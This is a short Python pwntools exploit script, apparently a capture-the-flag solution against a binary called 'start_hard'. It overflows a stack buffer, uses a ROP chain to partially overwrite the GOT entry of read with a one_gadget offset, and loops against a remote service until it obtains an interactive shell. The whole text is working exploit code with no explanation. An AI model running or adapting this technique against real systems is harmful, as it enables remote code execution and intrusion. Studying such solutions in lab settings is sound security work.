from pwn import *

elf = ELF('start_hard')
pop_rsi = 0x004005c1                # pop rsi; pop r15; ret
one_gadget = 0x1147                 # 0xf1147

def pwn():
    payload  = "A"*(0x10 + 8)
    payload += p64(pop_rsi) + p64(elf.got['read']) + "A"*8
    payload += p64(elf.symbols['read'])
    payload += p64(0x0040044d)      # call ___libc_start_main
    payload  = payload.ljust(0x400, '\x00')

    io.send(payload)

    io.send(p16(one_gadget))

    io.interactive()

while True:
    # io = process('./start_hard')
    io = remote('0.0.0.0.', 10001)
    pwn()

